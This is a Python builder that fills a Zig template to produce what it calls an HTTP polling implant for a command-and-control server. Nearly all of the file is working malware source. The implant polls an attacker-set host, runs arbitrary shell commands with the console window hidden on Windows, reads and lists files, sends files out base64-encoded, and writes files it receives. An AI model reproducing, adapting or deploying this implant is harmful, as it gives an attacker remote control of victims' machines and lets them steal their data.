#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zig Kitty HTTP polling implant source builder (Zig 0.15)."""

from __future__ import annotations

# Zig source uses __TOKEN__ placeholders so Python f-strings never collide with Zig {s}.
_ZIG_KITTY_TEMPLATE = r'''const std = @import("std");
const builtin = @import("builtin");
const process = std.process;
const mem = std.mem;
const json = std.json;
const base64 = std.base64;

const HOST = "__HOST__";
const PORT: u16 = __PORT__;
const PREFIX = "__PREFIX__";
const CID = "__CID__";
const POLL_BASE: u64 = __POLL__;
const UA = "__UA__";

fn sleepSecs(secs: u64) void {
    std.Thread.sleep(secs * std.time.ns_per_s);
}

fn b64Encode(allocator: mem.Allocator, data: []const u8) ![]u8 {
    const enc = base64.standard.Encoder;
    const out = try allocator.alloc(u8, enc.calcSize(data.len));
    _ = enc.encode(out, data);
    return out;
}

fn b64Decode(allocator: mem.Allocator, data: []const u8) ![]u8 {
    const dec = base64.standard.Decoder;
    const out = try allocator.alloc(u8, try dec.calcSizeForSlice(data));
    try dec.decode(out, data);
    return out;
}

fn httpExchange(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
    var stream = try std.net.tcpConnectToHost(allocator, HOST, PORT);
    defer stream.close();

    var req: std.ArrayList(u8) = .empty;
    defer req.deinit(allocator);
    const w = req.writer(allocator);
    try w.print("{s} {s} HTTP/1.1\r\n", .{ method, path_q });
    try w.print("Host: {s}:{d}\r\n", .{ HOST, PORT });
    try w.print("User-Agent: {s}\r\n", .{UA});
    try w.print("Accept: */*\r\n", .{});
    try w.print("Connection: close\r\n", .{});
    if (body) |b| {
        try w.print("Content-Type: application/json\r\n", .{});
        try w.print("Content-Length: {d}\r\n", .{b.len});
    } else {
        try w.print("Content-Length: 0\r\n", .{});
    }
    try req.appendSlice(allocator, "\r\n");
    if (body) |b| try req.appendSlice(allocator, b);
    try stream.writeAll(req.items);

    // Half-close write side so the server can finish the response without RST races on Windows
    if (builtin.os.tag == .windows) {
        _ = std.os.windows.ws2_32.shutdown(@ptrCast(stream.handle), 1); // SD_SEND
    } else {
        std.posix.shutdown(stream.handle, .send) catch {};
    }

    var resp: std.ArrayList(u8) = .empty;
    errdefer resp.deinit(allocator);
    var buf: [4096]u8 = undefined;
    while (true) {
        const n = stream.read(buf[0..]) catch break;
        if (n == 0) break;
        try resp.appendSlice(allocator, buf[0..n]);
        if (resp.items.len > 8 * 1024 * 1024) break;
        // Stop early once we have headers + Content-Length body
        if (mem.indexOf(u8, resp.items, "\r\n\r\n")) |idx| {
            const headers = resp.items[0..idx];
            if (mem.indexOf(u8, headers, "Content-Length:")) |cl| {
                const line_start = cl;
                const after = headers[line_start + "Content-Length:".len ..];
                var i: usize = 0;
                while (i < after.len and (after[i] == ' ' or after[i] == '\t')) : (i += 1) {}
                var j = i;
                while (j < after.len and after[j] >= '0' and after[j] <= '9') : (j += 1) {}
                if (j > i) {
                    const clen = std.fmt.parseInt(usize, after[i..j], 10) catch 0;
                    if (resp.items.len >= idx + 4 + clen) break;
                }
            }
        }
    }
    const raw = try resp.toOwnedSlice(allocator);
    if (mem.indexOf(u8, raw, "\r\n\r\n")) |idx| {
        const owned = try allocator.dupe(u8, raw[idx + 4 ..]);
        allocator.free(raw);
        return owned;
    }
    return raw;
}

fn jStr(obj: json.Value, key: []const u8) ?[]const u8 {
    if (obj != .object) return null;
    const v = obj.object.get(key) orelse return null;
    return if (v == .string) v.string else null;
}

fn jBool(obj: json.Value, key: []const u8) bool {
    if (obj != .object) return false;
    const v = obj.object.get(key) orelse return false;
    return if (v == .bool) v.bool else false;
}

fn jFloat(obj: json.Value, key: []const u8, default_v: f64) f64 {
    if (obj != .object) return default_v;
    const v = obj.object.get(key) orelse return default_v;
    return switch (v) {
        .float => |f| f,
        .integer => |i| @floatFromInt(i),
        else => default_v,
    };
}

fn execShell(allocator: mem.Allocator, cmd: []const u8) ![]u8 {
    const trimmed = mem.trim(u8, cmd, " \t\r\n");
    if (trimmed.len == 0) return try allocator.dupe(u8, "");

    var args: std.ArrayList([]const u8) = .empty;
    defer args.deinit(allocator);
    if (builtin.os.tag == .windows) {
        try args.append(allocator, "cmd.exe");
        try args.append(allocator, "/c");
    } else {
        try args.append(allocator, "/bin/sh");
        try args.append(allocator, "-c");
    }
    try args.append(allocator, trimmed);

    var child = process.Child.init(args.items, allocator);
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    if (builtin.os.tag == .windows) child.create_no_window = true;
    child.spawn() catch |e| return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});

    var out: std.ArrayList(u8) = .empty;
    defer out.deinit(allocator);
    var errb: std.ArrayList(u8) = .empty;
    defer errb.deinit(allocator);
    child.collectOutput(allocator, &out, &errb, 1024 * 1024) catch |e|
        return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});
    _ = child.wait() catch {};
    if (errb.items.len == 0) return try allocator.dupe(u8, out.items);
    try out.appendSlice(allocator, errb.items);
    return try out.toOwnedSlice(allocator);
}

const TaskResult = struct {
    out: []u8,
    status: []const u8,
    files_json: []u8,
    die: bool,
};

fn emptyFiles(allocator: mem.Allocator) ![]u8 {
    return try allocator.dupe(u8, "[]");
}

fn jsonEscapeAppend(list: *std.ArrayList(u8), allocator: mem.Allocator, s: []const u8) !void {
    for (s) |c| {
        switch (c) {
            '"' => try list.appendSlice(allocator, "\\\""),
            '\\' => try list.appendSlice(allocator, "\\\\"),
            '\n' => try list.appendSlice(allocator, "\\n"),
            '\r' => try list.appendSlice(allocator, "\\r"),
            '\t' => try list.appendSlice(allocator, "\\t"),
            else => try list.append(allocator, c),
        }
    }
}

fn buildFilesJson(allocator: mem.Allocator, path: []const u8, enc: []const u8) ![]u8 {
    var list: std.ArrayList(u8) = .empty;
    errdefer list.deinit(allocator);
    try list.appendSlice(allocator, "[{\"path\":\"");
    try jsonEscapeAppend(&list, allocator, path);
    try list.appendSlice(allocator, "\",\"encoding\":\"base64\",\"data\":\"");
    try list.appendSlice(allocator, enc);
    try list.appendSlice(allocator, "\"}]");
    return try list.toOwnedSlice(allocator);
}

fn buildResultBody(allocator: mem.Allocator, task_id: []const u8, enc_out: []const u8, status: []const u8, files_json: []const u8) ![]u8 {
    var list: std.ArrayList(u8) = .empty;
    errdefer list.deinit(allocator);
    try list.appendSlice(allocator, "{\"output\":\"");
    try list.appendSlice(allocator, enc_out);
    try list.appendSlice(allocator, "\",\"encoding\":\"base64\",\"id\":\"");
    try jsonEscapeAppend(&list, allocator, CID);
    try list.appendSlice(allocator, "\",\"task_id\":\"");
    try jsonEscapeAppend(&list, allocator, task_id);
    try list.appendSlice(allocator, "\",\"status\":\"");
    try jsonEscapeAppend(&list, allocator, status);
    try list.appendSlice(allocator, "\",\"files\":");
    try list.appendSlice(allocator, files_json);
    try list.append(allocator, '}');
    return try list.toOwnedSlice(allocator);
}

fn runTask(allocator: mem.Allocator, task: json.Value) !TaskResult {
    var die = false;
    var status: []const u8 = "completed";
    var files = try emptyFiles(allocator);
    var out = try allocator.dupe(u8, "");

    const cmd_raw = jStr(task, "command") orelse "";
    var lower_buf: [64]u8 = undefined;
    const n = @min(cmd_raw.len, lower_buf.len);
    for (cmd_raw[0..n], 0..) |c, i| {
        lower_buf[i] = if (c >= 'A' and c <= 'Z') c + 32 else c;
    }
    const cmd = lower_buf[0..n];
    const args: json.Value = if (task == .object) (task.object.get("args") orelse .null) else .null;

    if (mem.eql(u8, cmd, "shell") or mem.eql(u8, cmd, "cmd")) {
        allocator.free(out);
        out = try execShell(allocator, jStr(args, "cmd") orelse jStr(args, "command") orelse "");
    } else if (mem.eql(u8, cmd, "pwd")) {
        allocator.free(out);
        out = process.getCwdAlloc(allocator) catch try allocator.dupe(u8, ".");
    } else if (mem.eql(u8, cmd, "whoami")) {
        allocator.free(out);
        out = try execShell(allocator, if (builtin.os.tag == .windows) "whoami" else "id -un");
    } else if (mem.eql(u8, cmd, "ls")) {
        const path = jStr(args, "path") orelse ".";
        var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        defer dir.close();
        var list: std.ArrayList(u8) = .empty;
        defer list.deinit(allocator);
        var it = dir.iterate();
        while (try it.next()) |entry| {
            try list.appendSlice(allocator, entry.name);
            try list.append(allocator, '\n');
        }
        allocator.free(out);
        out = try list.toOwnedSlice(allocator);
    } else if (mem.eql(u8, cmd, "cat")) {
        const path = jStr(args, "path") orelse "";
        const data = std.fs.cwd().readFileAlloc(allocator, path, 200_000) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        allocator.free(out);
        out = data;
    } else if (mem.eql(u8, cmd, "download")) {
        const path = jStr(args, "path") orelse "";
        const data = std.fs.cwd().readFileAlloc(allocator, path, 8 * 1024 * 1024) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        defer allocator.free(data);
        const enc = try b64Encode(allocator, data);
        defer allocator.free(enc);
        allocator.free(files);
        files = try buildFilesJson(allocator, path, enc);
        allocator.free(out);
        out = try std.fmt.allocPrint(allocator, "OK {d} bytes", .{data.len});
    } else if (mem.eql(u8, cmd, "upload")) {
        const path = jStr(args, "path") orelse "";
        const blob = jStr(args, "data") orelse "";
        const raw = b64Decode(allocator, blob) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        defer allocator.free(raw);
        std.fs.cwd().writeFile(.{ .sub_path = path, .data = raw }) catch |e| {
            allocator.free(out);
            out = try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
            status = "failed";
            return .{ .out = out, .status = status, .files_json = files, .die = die };
        };
        allocator.free(out);
        out = try std.fmt.allocPrint(allocator, "OK wrote {s}", .{path});
    } else if (mem.eql(u8, cmd, "exit")) {
        allocator.free(out);
        out = try allocator.dupe(u8, "bye");
        die = true;
    } else {
        allocator.free(out);
        out = try execShell(allocator, cmd_raw);
    }

    return .{ .out = out, .status = status, .files_json = files, .die = die };
}

fn postResult(allocator: mem.Allocator, task_id: []const u8, out: []const u8, status: []const u8, files_json: []const u8) void {
    const enc = b64Encode(allocator, out) catch return;
    defer allocator.free(enc);
    const body = buildResultBody(allocator, task_id, enc, status, files_json) catch return;
    defer allocator.free(body);
    const path = std.fmt.allocPrint(allocator, "{s}/result?id={s}", .{ PREFIX, CID }) catch return;
    defer allocator.free(path);
    const resp = httpExchange(allocator, "POST", path, body) catch return;
    allocator.free(resp);
}

fn handleTaskValue(allocator: mem.Allocator, task: json.Value, next_sleep: u64) !bool {
    const tid = jStr(task, "task_id") orelse "";
    const result = try runTask(allocator, task);
    defer allocator.free(result.out);
    defer allocator.free(result.files_json);
    postResult(allocator, tid, result.out, result.status, result.files_json);
    if (result.die) return true;
    sleepSecs(next_sleep);
    return false;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{ .safety = false }){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    while (true) {
        const path = try std.fmt.allocPrint(allocator, "{s}/poll?id={s}", .{ PREFIX, CID });
        defer allocator.free(path);

        const body = httpExchange(allocator, "GET", path, null) catch {
            sleepSecs(POLL_BASE);
            continue;
        };
        defer allocator.free(body);

        const parsed = json.parseFromSlice(json.Value, allocator, body, .{}) catch {
            sleepSecs(POLL_BASE);
            continue;
        };
        defer parsed.deinit();
        const root = parsed.value;
        if (jBool(root, "die")) break;

        var next_sleep: u64 = POLL_BASE;
        const ns = jFloat(root, "next_sleep", @floatFromInt(POLL_BASE));
        if (ns > 0) next_sleep = @as(u64, @intFromFloat(ns));

        var handled = false;
        if (root == .object) {
            if (root.object.get("task")) |t| {
                if (t == .object) {
                    handled = true;
                    if (try handleTaskValue(allocator, t, next_sleep)) break;
                }
            }
        }

        if (!handled) {
            const enc = jStr(root, "encoding") orelse "";
            const cmd_field = jStr(root, "command") orelse "";
            if (cmd_field.len > 0) {
                if (mem.eql(u8, enc, "task")) {
                    const tp = json.parseFromSlice(json.Value, allocator, cmd_field, .{}) catch null;
                    if (tp) |p2| {
                        defer p2.deinit();
                        if (try handleTaskValue(allocator, p2.value, next_sleep)) break;
                        handled = true;
                    }
                }
                if (!handled) {
                    var shell_cmd: []const u8 = cmd_field;
                    var decoded: ?[]u8 = null;
                    if (mem.eql(u8, enc, "base64")) {
                        decoded = b64Decode(allocator, cmd_field) catch null;
                        if (decoded) |d| shell_cmd = d;
                    }
                    defer if (decoded) |d| allocator.free(d);
                    const out = execShell(allocator, shell_cmd) catch try allocator.dupe(u8, "ERROR");
                    defer allocator.free(out);
                    postResult(allocator, "", out, "completed", "[]");
                }
            }
            if (!handled) sleepSecs(next_sleep);
        }
    }
}
'''


def build_zig_kitty_http_source(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: int = 10,
    user_agent: str = "Mozilla/5.0",
) -> str:
    """Return Zig source for a typed Kitty agent against reverse_http_polling."""
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    cid = str(client_id or "zigkitty1").replace("\\", "\\\\").replace('"', '\\"')
    h = str(host or "127.0.0.1").replace("\\", "\\\\").replace('"', '\\"')
    ua = str(user_agent or "Mozilla/5.0").replace("\\", "\\\\").replace('"', '\\"')
    return (
        _ZIG_KITTY_TEMPLATE.replace("__HOST__", h)
        .replace("__PORT__", str(int(port or 8088)))
        .replace("__PREFIX__", prefix)
        .replace("__CID__", cid)
        .replace("__POLL__", str(max(1, int(poll_interval or 10))))
        .replace("__UA__", ua)
    )
